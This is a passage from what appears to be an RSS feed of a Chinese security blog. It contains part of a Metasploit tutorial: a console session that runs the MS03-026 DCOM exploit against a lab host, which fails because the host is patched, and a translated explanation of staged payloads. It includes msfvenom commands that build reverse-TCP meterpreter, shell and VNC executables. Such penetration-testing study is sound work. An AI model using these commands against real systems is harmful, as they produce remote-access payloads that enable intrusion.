192.168.56.146<br>RHOST =&gt; 192.168.56.146<br>msf5 exploit(windows/dcerpc/ms03_026_dcom) &gt; </p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">"https://i.imgur.com/U6NHEVX.png"</span>&gt;</span><br><span class="line"></span><br><span class="line">输入“exploit”就会创建会话</span><br></pre></td></tr></table></figure></div><p>msf5 exploit(windows/dcerpc/ms03_026_dcom) &gt; exploit</p><pre><code>这里因为我使用的windows 2003 已经有该漏洞的补丁了，所以利用失败了#### 原文链接：   https://www.tutorialspoint.com/metasploit/metasploit_payload.htm### 2、HowPayloads Workpayload模块位于modules/payloads/{singles,stages,stagers}/&lt;platform&gt;&gt;。当框架启动时，stages与stagers结合以创建可在漏洞利用中使用的完整的payload。然后，handlers与payload配对，因此框架将知道如何使用给定的通信机制创建会话。Payload被赋予参考名称，如下所示：Staged payloads：&lt;platform&gt;/ [arch] / &lt;stage&gt; / &lt;stager&gt;Single payloads：&lt;platform&gt;/ [arch] / &lt;single&gt;这会产生像windows/ x64 / meterpreter / reverse_tcp这样的payload。平台是windows，架构是x64，我们提供的最终的stage是meterpreter，而传递它的stager是reverse_tcp。请注意，arch是可选的，因为在某些情况下，它是不必要或者已经默认了。比如php/ meterpreter / reverse_tcp。PHP的payload不需要Arch，因为我们提供的是解释代码而不是二进制代码。SinglesSinglepayload发射后就不管了（就像发射x级火箭一样）。它们可以与Metasploit建立沟通机制，但没有必要。你可能会需要singlepayload的场景就是目标没有接入网络，此时仍然可以通过USB密钥提供文件格式攻击。StagersStagers是一个小发射器（同样以火箭发射作比喻），旨在创建某种形式的通信，然后将执行传递到下一个阶段。使用stager解决了两个问题。首先，它允许我们最初使用较小的有效负载来加载具有更多功能的较大的payload。其次，它使通信机制与最终阶段分离成为可能，因此一个payload无需复制代码就可以与多个传输一起使用。Stages由于stager通过为我们分配大量内存来介意任何大小限制问题，因此stages可以任意大。它的优点之一是能够以更高级别的语言（如C语言）编写最终阶段的payload。DeliveringStages你希望payload连接回来的IP地址和端口被嵌入到stager中。如上所述，所有staged payload仅仅是建立通信并执行下一阶段的小推进器。当使用staged payload创建可执行文件时，实际上只是创建了stager。所以以下命令将创建功能相同的exe文件：msfvenom-f exe LHOST=192.168.1.1 -p windows/meterpreter/reverse_tcpmsfvenom-f exe LHOST=192.168.1.1 -p windows/shell/reverse_tcpmsfvenom-f exe LHOST=192.168.1.1 -p windows/vncinject/reverse_tcp（请注意，它们在功能上是相同的- 但是由于其中有很多随机化，因此没有两个可执行文件是完全相同的）无论使用stager设置的哪种传输机制（例如：tcp，http，https），Ruby端都是充当客户端。对于shell阶段，Metasploit会在你与其进行交互时将远程进程的标准输入输出连接到你的终端。在Meterpreter阶段的情况下，Metasploit将开始使用Meterpreterwire协议。#### 原文：   https://github.com/rapid7/metasploit-framework/wiki/How-payloads-work</code></pre>]]></content:encoded>
      
      <comments>http://yoursite.com/undefined/MSF--Metasploit%20Framework%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/#disqus_thread</comments>
    </item>
    
    <item>
      <title>ISCC | Where is file?</title>
      <link>http://yoursite.com/undefined/[ISCC]Where%20is%20file/</link>
      <guid>http://yoursite.com/undefined/[ISCC]Where%20is%20file/</guid>
      <pubDate>Fri, 08 May 2020 12:22:40 GMT</pubDate>
      <description>
      
      </description>
      
      
      <comments>http://yoursite.com/undefined/[ISCC]Where%20is%20file/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
